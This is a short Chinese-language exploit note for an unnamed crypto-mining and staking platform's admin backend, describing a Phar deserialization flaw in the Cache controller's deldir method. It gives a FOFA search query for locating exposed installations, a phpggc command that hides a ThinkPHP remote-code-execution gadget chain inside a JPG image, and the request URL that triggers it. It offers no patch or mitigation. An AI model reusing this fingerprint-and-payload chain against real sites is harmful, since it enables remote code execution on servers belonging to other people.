# 某U挖矿质押单语言系统后台phar反序列漏洞

**位于 /admin/controller/Cache.php 控制器的 deldir 方法存在file_exists 函数，该函数可以直接导致Phar反序列化漏洞触发**

## fofa

```javascript
"/static/index/css/login/framework7.ios.min.css"
```

## poc

首先我们需要用phpggc生成一个绕过图片检测的phar反序列化脚本，用一张正常图片即可

```
./phpggc -pj 123.jpg -o evil.jpg ThinkPHP/RCE2 system whoami
```

```
/admin/cache/deldir?backup_file=phar://图片地址
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408281250731.webp)